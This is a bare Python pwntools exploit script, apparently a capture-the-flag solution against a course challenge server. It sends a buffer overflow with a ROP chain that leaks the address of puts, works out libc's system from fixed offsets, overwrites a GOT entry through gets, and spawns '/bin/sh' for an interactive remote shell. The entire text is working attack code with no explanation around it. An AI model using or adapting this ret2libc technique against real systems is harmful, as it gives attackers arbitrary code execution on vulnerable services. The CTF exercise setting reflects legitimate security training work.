from pwn import *

context.arch = "amd64"

pop_rdi = 0x00000000004006f3
puts_got = 0x0000000000601018
puts_plt = 0x4004e0
gets_plt = 0x400510

payload = 'A' * 40
rop = flat([pop_rdi, puts_got, puts_plt, pop_rdi, puts_got, gets_plt, pop_rdi, puts_got + 8, puts_plt])

r = remote("csie.ctf.tw", 10131)
r.sendafter(':', payload + rop + '\n')
r.recvuntil('\n')
puts = u64(r.recvuntil('\n').strip().ljust(8,'\x00'))
system = puts - 0x6f690 + 0x45390

payload = p64(system) + "/bin/sh\x00"

r.sendline(payload)
r.interactive()
